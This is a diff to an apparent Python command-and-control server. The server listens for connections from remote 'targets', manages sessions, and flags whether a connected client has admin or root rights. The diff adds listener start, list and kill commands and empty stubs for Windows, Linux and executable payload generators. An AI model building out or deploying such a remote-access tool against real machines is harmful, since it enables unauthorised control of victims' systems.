@@ -23,6 +23,15 @@ def recieve_message(target_id) :
     response = target_id.recv(4096).decode(errors="replace")
     return response
 
+def winplant():
+    pass
+
+def linplant():
+    pass
+
+def exeplant():
+    pass
+
 def get_last_client_username(list_of_targets):
     target_id = list_of_targets[-1][0]
     target_ip = list_of_targets[-1][1]
@@ -74,29 +83,70 @@ def handle_single_target_communication(target_index, list_of_targets):
             print("[-] Connection closed.\n")
             break
         except Exception:
-            communication_socket.close()
+            list_of_sockets[0].close()
             break
 
 def close_all_connections(list_of_targets):
     print("\n[-] Closing...\n")
     for target in list_of_targets:
         send_message(target[0], "exit")
-    communication_socket.close()
+    list_of_sockets[0].close()
 
 """
 List of supported commands for server_cli:
 sessions, cd, ls, exit
 """
 def handle_server_cli_commands(list_of_targets):
-    command = input("Enter_command#> ").strip()
+    global listener_counter
+    if listener_counter > 0:
+        command = input("(listening) Enter_command#> ").strip()
+    else:
+        command = input("Enter_command#> ").strip()
     # void command
     if command == "":
         pass
     # "sessions" without arguments
-    elif command.strip() == "listeners":
-        host_ip = input("[+] Enter the IP to listen on : ")
-        host_port = input("[+] Enter the port to listen on : ")
-        prepare_socket_thread(host_ip, host_port)
+    elif command.strip() == "listen":
+        if listener_counter > 0:
+            print("Already listening. Use 'listen -l' to display info.\n")
+        else:
+            host_ip = input("\n[+] Enter the IP to listen on : ")
+            host_port = input("[+] Enter the port to listen on : ")
+            try:
+                prepare_socket_thread(host_ip, host_port)
+                listener_counter += 1
+            except Exception as error:
+                print("\n[-] Values provided are not valid.\n")
+    elif command.strip() == "listen -l":
+        if listener_counter == 0:
+            print("Not listening.\n")
+        else:
+            host_ip = list_of_sockets[0].getsockname()[0]
+            host_port = list_of_sockets[0].getsockname()[1]
+            print(f"Listening on network interface {host_ip} through port {host_port}.\n")
+    elif command.strip() == "listen -k":
+        if listener_counter > 0:
+            listener_counter -= 1
+            close_all_connections(list_of_targets)
+            list_of_sockets.pop() 
+            list_of_sockets.append(socket.socket(socket.AF_INET, socket.SOCK_STREAM))
+        else:
+            print("Not listening. There is nothing to kill.\n")
+    elif command.strip() == "winplant":
+        if listener_counter > 0:
+            winplant()
+        else:
+            print("\n[-] You cannot generate a payload without an active listener.\n")
+    elif command.strip() == "linplant":
+        if listener_counter > 0:
+            linplant()
+        else:
+            print("\n[-] You cannot generate a payload without an active listener.\n")
+    elif command.strip() == "exeplant":
+        if listener_counter > 0:
+            exeplant()
+        else:
+            print("\n[-] You cannot generate a payload without an active listener.\n")
     elif (command.split()[0] == "sessions") and (len(command.split()) == 1):
         print("Usage : sessions [flag] [value]")
         print("    -l           list all sessions")
@@ -170,7 +220,7 @@ def run_server_cli(list_of_targets):
 def welcome_new_connections():
     while True:
         try:
-            new_target, new_ip = communication_socket.accept()
+            new_target, new_ip = list_of_sockets[0].accept()
             admin = recieve_message(new_target)
             is_admin = False
             if (admin.split()[0] == "Linux") and (admin.split()[1] == "0"):
@@ -190,28 +240,28 @@ def welcome_new_connections():
             get_last_client_username(list_of_targets)
             print(f"\n[+] Connection recieved from {new_ip[0]}.")
             print(f"    \___ time of connection : {time_record}")
-            print(f"    \___ port used on the client : {new_ip[1]}\n\nEnter_command#> ", end="")
+            print(f"    \___ port used on the client : {new_ip[1]}\n\n(listening) Enter_command#> ", end="")
         except Exception:
-            communication_socket.close()
+            if len(list_of_sockets) != 0:
+                list_of_sockets[0].close()
             break
 
 def prepare_socket_thread(host_ip, host_port):
-    communication_socket.bind((host_ip, int(host_port)))
+    list_of_sockets[0].bind((host_ip, int(host_port)))
     print("[+] Awaiting connection from client...\n")
-    communication_socket.listen()
+    list_of_sockets[0].listen()
     t1 = threading.Thread(target=welcome_new_connections)
     t1.start()
 
 if __name__ == "__main__":
     print_banner()
     list_of_targets = []
+    listener_counter = 0
+    list_of_sockets = []
     try:
-        communication_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        list_of_sockets.append(sock)
         # So far the server can only listen on one network interface
-        # HOST_IP = "172.17.176.1"
-        # # HOST_IP = "127.0.0.1"
-        # HOST_PORT = 4444
-        # prepare_socket_thread(HOST_IP, HOST_PORT)
         run_server_cli(list_of_targets)
     except IndexError:
         print("[-] Command line argument(s) missing.")
